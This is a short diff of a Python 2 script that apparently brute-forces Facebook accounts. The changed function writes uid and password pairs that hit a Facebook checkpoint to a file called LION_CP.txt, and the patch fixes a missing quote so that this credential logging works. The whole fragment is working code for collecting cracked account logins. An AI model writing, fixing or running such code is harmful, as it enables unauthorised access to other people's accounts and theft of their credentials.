@@ -1070,7 +1070,7 @@ def n_s():
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
                         print '\x1b[1;31;1m[LION-CP] ' + uid + ' | ' + pass3
-                        cp = open('LION_CP.txt',  a')
+                        cp = open('LION_CP.txt',  'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
